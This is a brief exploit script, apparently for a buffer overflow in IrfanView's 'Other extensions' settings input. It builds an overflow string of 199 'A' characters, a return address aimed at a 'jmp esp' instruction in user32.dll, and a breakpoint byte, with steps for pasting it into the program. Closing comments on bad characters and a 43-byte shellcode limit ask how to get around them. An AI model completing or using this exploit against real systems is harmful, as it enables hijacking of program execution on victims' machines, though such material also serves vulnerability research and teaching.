      eip = "\xf7\x56\x44\x7e" #jmp esp from user32.dll



      buffer = "OtherExtensions="+"A" *  199 + eip + "\xcc"

      print buffer              #a) irfanview->Option->Properties/Settings->Extensions
                                #b) Paste the buffer in the "other" input then press ok, repeat a) and b)





#badcharacters: those instruction that start with 6,7,8,E,F
#Only 43 bytes space to host a shellcode and lots of badchars make it hard for this to exploit
#Any other way around this?
